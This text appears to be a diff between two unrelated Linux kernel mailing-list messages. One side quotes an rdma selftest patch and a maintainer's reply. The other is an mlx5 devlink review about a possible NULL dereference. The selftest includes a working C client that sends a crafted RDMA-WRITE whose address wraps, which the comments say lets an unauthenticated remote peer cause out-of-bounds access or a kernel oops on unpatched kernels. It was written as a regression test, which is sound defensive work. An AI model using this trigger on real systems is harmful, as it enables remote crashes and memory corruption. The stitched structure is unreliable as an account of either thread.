+> +	if (rdma_resolve_addr(id, NULL, (struct sockaddr *)&sin, 5000)) { perror("resolve_addr"); return 1; }
+> +	if (wait_ev(ec, &ev, RDMA_CM_EVENT_ADDR_RESOLVED)) return 1;
+> +	rdma_ack_cm_event(ev);
+> +	if (rdma_resolve_route(id, 5000)) { perror("resolve_route"); return 1; }
+> +	if (wait_ev(ec, &ev, RDMA_CM_EVENT_ROUTE_RESOLVED)) return 1;
+> +	rdma_ack_cm_event(ev);
+> +
+> +	struct ibv_pd *pd = ibv_alloc_pd(id->verbs);
+> +	struct ibv_cq *cq = ibv_create_cq(id->verbs, 8, NULL, NULL, 0);
+> +	void *buf = calloc(1, MR_LEN);
+> +	struct ibv_mr *mr = ibv_reg_mr(pd, buf, MR_LEN, IBV_ACCESS_LOCAL_WRITE);
+> +	struct ibv_qp_init_attr qa = {0};
+> +	qa.send_cq = cq; qa.recv_cq = cq; qa.qp_type = IBV_QPT_RC;
+> +	qa.cap.max_send_wr = 4; qa.cap.max_recv_wr = 4;
+> +	qa.cap.max_send_sge = 2; qa.cap.max_recv_sge = 2;
+> +	if (rdma_create_qp(id, pd, &qa)) { perror("create_qp"); return 1; }
+> +
+> +	struct rdma_conn_param p = {0};
+> +	p.initiator_depth = 1; p.responder_resources = 1; p.retry_count = 3;
+> +	if (rdma_connect(id, &p)) { perror("connect"); return 1; }
+> +	if (wait_ev(ec, &ev, RDMA_CM_EVENT_ESTABLISHED)) return 1;
+> +
+> +	struct mr_info info = {0};
+> +	if (ev->param.conn.private_data_len >= (int)sizeof(info))
+> +		memcpy(&info, ev->param.conn.private_data, sizeof(info));
+> +	rdma_ack_cm_event(ev);
+> +
+> +	/* The malicious RDMA-WRITE: remote_addr makes iova+length wrap. */
+> +	struct ibv_sge sge = { .addr = (uintptr_t)buf, .length = WR_LEN, .lkey = mr->lkey };
+> +	struct ibv_send_wr wr = {0}, *bad;
+> +	wr.wr_id = 0xdead;
+> +	wr.opcode = IBV_WR_RDMA_WRITE;
+> +	wr.send_flags = IBV_SEND_SIGNALED;
+> +	wr.sg_list = &sge;
+> +	wr.num_sge = 1;
+> +	wr.wr.rdma.remote_addr = BAD_ADDR;
+> +	wr.wr.rdma.rkey = info.rkey;
+> +	printf("[client] post RDMA-WRITE remote_addr=%#llx len=%d rkey=%#x\n",
+> +		(unsigned long long)BAD_ADDR, WR_LEN, info.rkey);
+> +	fflush(stdout);
+> +	ibv_post_send(id->qp, &wr, &bad);
+> +
+> +	struct ibv_wc wc;
+> +	int n, tries = 5000;
+> +	while (tries-- > 0 && (n = ibv_poll_cq(cq, 1, &wc)) == 0)
+> +		usleep(1000);
+> +	if (n > 0)
+> +		printf("[client] completion status=%d (%s)\n",
+> +			wc.status, ibv_wc_status_str(wc.status));
+> +	else
+> +		printf("[client] no completion (responder likely crashed)\n");
+> +	sleep(2);
+> +	return 0;
+> +}
+> +
+> +int main(int argc, char **argv)
+> +{
+> +	if (argc == 3)			/* server <ip> <port> */
+> +		return run_server(argv[1], atoi(argv[2]));
+> +	if (argc == 4 && !strcmp(argv[1], "-c"))	/* -c <ip> <port> */
+> +		return run_client(argv[2], atoi(argv[3]));
+> +	fprintf(stderr, "Usage:\n  server: %s <ip> <port>\n  client: %s -c <ip> <port>\n",
+> +		argv[0], argv[0]);
+> +	return 1;
+> +}
+> diff --git a/tools/testing/selftests/rdma/rxe_mr_overflow.sh b/tools/testing/selftests/rdma/rxe_mr_overflow.sh
+> new file mode 100644
+> index 000000000000..2590e41be99b
+> --- /dev/null
+> +++ b/tools/testing/selftests/rdma/rxe_mr_overflow.sh
+> @@ -0,0 +1,132 @@
+> +#!/bin/bash
+> +# SPDX-License-Identifier: GPL-2.0
+> +#
+> +# Regression test for the mr_check_range() iova overflow in SoftRoCE (rxe).
+> +#
+> +# A remote peer can craft an RDMA-WRITE whose RETH makes iova + length wrap
+> +# to 0, bypassing the old
+> +#
+> +#	if (iova + length > mr->ibmr.iova + mr->ibmr.length)
+> +#
+> +# range check in mr_check_range(). The responder then derives a huge page
+> +# index in rxe_mr_iova_to_index() (only WARN_ON-guarded) and dereferences
+> +# mr->page_info[huge] -> out-of-bounds read/write / kernel oops, triggerable
+> +# by an unauthenticated remote peer.
+> +#
+> +# Fixed by rewriting the check in overflow-safe form:
+> +#
+> +#	if (iova < mr->ibmr.iova ||
+> +#	    length > mr->ibmr.length ||
+> +#	    iova - mr->ibmr.iova > mr->ibmr.length - length)
+> +#
+> +# Topology: a veth pair across a network namespace, one rxe device on each
+> +# end. The server (ns) registers a USER MR and accepts an RDMA_CM
+> +# connection, passing its rkey/iova in the private data. The client (host)
+> +# posts one RDMA-WRITE with remote_addr = 0xfffffffffffffff8, len = 8.
+> +#
+> +#   - Patched kernel:   PASS  (mr_check_range() rejects the crafted iova;
+> +#                              the client completion is IBV_WC_REM_ACCESS_ERR;
+> +#                              no kernel warning/oops in dmesg)
+> +#   - Unpatched kernel: FAIL  (WARN_ON in rxe_mr_iova_to_index followed by
+> +#                              an OOB page fault / oops in rxe_mr_copy)
+> +
+Thanks a lot. When I run rdma selftests. I got the following:
+"
+# Warning: file rxe_mr_overflow.sh is not executable
+"
+You need to make rxe_mr_overflow.sh executable.
 
-On 31/07/2026 19:57, Simon Horman wrote:
-> On Wed, Jul 29, 2026 at 10:00:59AM +0300, Tariq Toukan wrote:
->
-> ...
->
->> @@ -252,6 +275,16 @@ int mlx5_esw_offloads_devlink_port_register(struct mlx5_eswitch *esw, struct mlx
->>   		mlx5_core_dbg(dev, "Failed to register port resources: %d\n",
->>   			      err);
->>   
->> +	rep = mlx5_eswitch_vport_rep(esw, vport_num);
->> +	reporter = devl_port_health_reporter_create(
->> +		&dl_port->dl_port, &mlx5_esw_rep_vnic_reporter_ops, rep);
-> Hi Caroila, and Tariq,
->
-> I'm wondering if you could take a look over the following which appears at
-> https://netdev-ai.bots.linux.dev/sashiko/#/patchset/20260729070059.2421788-1-tariqt%40nvidia.com
->
->    Can rep or rep->esw be NULL at this point?
->
->    mlx5_eswitch_vport_rep() is a plain lookup with no NULL check here:
->
->    eswitch_offloads.c:mlx5_eswitch_get_rep() {
-> 	return xa_load(&esw->offloads.vport_reps, vport);
->    }
->
->    and rep->esw is only assigned lazily. In mlx5_esw_offloads_rep_add() the
->    assignment sits after the continue that is taken whenever no rep_ops are
->    registered yet, which is the state at probe time when
->    esw_offloads_init_reps() creates the reps:
->
->    eswitch_offloads.c:mlx5_esw_offloads_rep_add() {
-> 	rep = kzalloc_obj(*rep);
-> 	...
-> 	for (rep_type = 0; rep_type < NUM_REP_TYPES; rep_type++) {
-> 		if (!esw->offloads.rep_ops[rep_type]) {
-> 			atomic_set(&rep->rep_data[rep_type].state,
-> 				   REP_UNREGISTERED);
-> 			continue;
-> 		}
-> 		...
-> 		rep->esw = esw;
-> 	}
->    }
->
->    The only other writer is mlx5_eswitch_register_vport_reps_blocked(),
->    which runs from the mlx5_core.eth-rep auxiliary driver probe
->    (mlx5e_rep_probe() -> mlx5_eswitch_register_vport_reps()):
->
->    eswitch_offloads.c:mlx5_eswitch_register_vport_reps_blocked() {
-> 	esw->offloads.rep_ops[rep_type] = ops;
-> 	mlx5_esw_for_each_rep(esw, i, rep) {
-> 		if (likely(mlx5_eswitch_vport_has_rep(esw, rep->vport))) {
-> 			rep->esw = esw;
-> 			...
->    }
->
->    Is that probe guaranteed to have succeeded before ports are registered?
->    esw_mode_change() discards the mlx5_rescan_drivers_locked() return value
->    and sets esw->mode = mode regardless, and add_drivers() only warns when
->    add_adev() fails:
->
->    dev.c:add_drivers() {
-> 	priv->adev[i] = add_adev(dev, i);
-> 	if (IS_ERR(priv->adev[i])) {
-> 		mlx5_core_warn(dev, "Device[%d] (%s) failed to load\n", ...);
-> 		/* We continue to rescan drivers and leave to the caller ... */
->
->    In that case rep_ops[REP_ETH] stays NULL, rep->esw stays NULL, and
->    mlx5_eswitch_load_vport() -> mlx5_esw_offloads_load_rep() ->
->    mlx5_esw_offloads_devlink_port_register() still installs a live reporter.
->    Would a subsequent "devlink health diagnose <dev>/<port> reporter vnic"
->    then oops on rep->esw->dev in mlx5_esw_rep_vnic_reporter_diagnose(),
->    with the devlink instance lock held?
->
->    The old code could not hit this because the reporter was created from the
->    REP_ETH load callback, i.e. only after rep_ops were registered and
->    rep->esw was set. Note also that mlx5_esw_offloads_rep_remove() does
->    check the same lookup result for NULL, which this call site does not.
->
->    Since struct mlx5_devlink_port already carries a struct mlx5_vport
->    pointer, which gives both vport->dev and vport->vport and whose lifetime
->    matches the port exactly, could dl_port->vport be used as the reporter
->    priv instead of the rep?
+And please also check and try to fix some warnings from sashiko.
 
+Thanks a lot.
+Zhu Yanjun
 
-Good point, will fix it. Thanks
+> +NS="rxe_mrovf"
+> +VETH_NS="vmo-a"
+> +VETH_HOST="vmo-b"
+> +IP_NS="1.1.1.1"
+> +IP_HOST="1.1.1.2"
+> +PORT=4792
+> +BIN="$(dirname "$(readlink -f "$0")")/rxe_mr_overflow"
+> +
+> +source "$(dirname "$0")/../kselftest/ktap_helpers.sh"
+> +
+> +SRV=
+> +
+> +# Remove the topology this script creates. Idempotent: safe to call even when
+> +# some of the resources no longer exist (e.g. partial setup, prior abort).
+> +rxe_teardown() {
+> +	rdma link del rxe1 2>/dev/null
+> +	ip netns exec "$NS" rdma link del rxe0 2>/dev/null
+> +	ip link delete "$VETH_HOST" 2>/dev/null
+> +	ip netns del "$NS" 2>/dev/null
+> +}
+> +
+> +cleanup() {
+> +	trap '' INT TERM EXIT		# guard against re-entry
+> +	# Kill the server first so the client does not block on a dead peer.
+> +	[ -n "$SRV" ] && kill "$SRV" 2>/dev/null
+> +	wait "$SRV" 2>/dev/null
+> +	rxe_teardown
+> +	modprobe -r rdma_rxe 2>/dev/null
+> +}
+> +# Cover normal exit, Ctrl+C (SIGINT) and kill (SIGTERM) alike.
+> +trap cleanup INT TERM EXIT
+> +
+> +# Tear down any leftover topology from a previous aborted run (SIGINT, kill
+> +# -9, guest crash, ...) so this script is always re-runnable instead of
+> +# failing on "RTNETLINK answers: File exists".
+> +rxe_teardown
+> +
+> +# --- Prerequisites ---
+> +if [ "$EUID" -ne 0 ]; then
+> +	ktap_print_header
+> +	ktap_skip_all "needs root"
+> +	exit "$KSFT_SKIP"
+> +fi
+> +if ! modinfo rdma_rxe >/dev/null 2>&1; then
+> +	ktap_print_header
+> +	ktap_skip_all "rdma_rxe module not found"
+> +	exit "$KSFT_SKIP"
+> +fi
+> +if [ ! -x "$BIN" ]; then
+> +	ktap_print_header
+> +	ktap_skip_all "$BIN not built (needs libibverbs-dev / librdmacm-dev)"
+> +	exit "$KSFT_SKIP"
+> +fi
+> +
+> +modprobe rdma_rxe >/dev/null 2>&1
+> +
+> +# --- Topology: veth pair across a netns, one rxe device on each end ---
+> +ip netns add "$NS"
+> +ip link add "$VETH_NS" type veth peer name "$VETH_HOST"
+> +ip link set "$VETH_NS" netns "$NS"
+> +
+> +ip netns exec "$NS" ip addr add "$IP_NS/24" dev "$VETH_NS"
+> +ip netns exec "$NS" ip link set "$VETH_NS" up
+> +ip netns exec "$NS" ip link set lo up
+> +ip addr add "$IP_HOST/24" dev "$VETH_HOST"
+> +ip link set "$VETH_HOST" up
+> +
+> +ip netns exec "$NS" rdma link add rxe0 type rxe netdev "$VETH_NS"
+> +rdma link add rxe1 type rxe netdev "$VETH_HOST"
+> +
+> +if ! ping -c 2 -W 1 "$IP_NS" >/dev/null 2>&1; then
+> +	ktap_print_header
+> +	ktap_skip_all "no connectivity between host and netns"
+> +	exit "$KSFT_SKIP"
+> +fi
+> +
+> +# Only look at warnings produced by this run.
+> +dmesg -C >/dev/null 2>&1
+> +
+> +# --- Run: server in the netns, client on the host ---
+> +# On an unpatched kernel the crafted WRITE can wedge the responder; wrap both
+> +# sides in timeout() so the script always reaches a verdict and runs cleanup
+> +# instead of hanging on a stuck peer.
+> +ktap_print_header
+> +ktap_set_plan 1
+> +
+> +ip netns exec "$NS" timeout 30 "$BIN" "$IP_NS" "$PORT" >/dev/null 2>&1 &
+> +SRV=$!
+> +sleep 2
+> +timeout 30 "$BIN" -c "$IP_NS" "$PORT" >/dev/null 2>&1
+> +wait "$SRV" 2>/dev/null
+> +
+> +# --- Verdict: any rxe MR-range warning / OOB means the kernel is unpatched ---
+> +if dmesg 2>/dev/null | grep -qE "rxe_mr_iova_to_index|mr_check_range|BUG:.*rxe_mr_copy|KASAN:.*rxe_mr"; then
+> +	ktap_test_fail "mr_check_range() iova overflow (UNPATCHED): OOB/WARN in dmesg"
+> +else
+> +	ktap_test_pass "mr_check_range() rejected crafted iova (patched)"
+> +fi
+> +
+> +ktap_finished
 
->
->> +	if (IS_ERR(reporter))
->> +		mlx5_core_dbg(dev,
->> +			      "Failed to create vnic health reporter for vport %d: %pe\n",
->> +			      vport_num, reporter);
->> +	else
->> +		dl_port->vnic_reporter = reporter;
->> +
->>   	return 0;
->>   
->>   rate_err:
-> ...
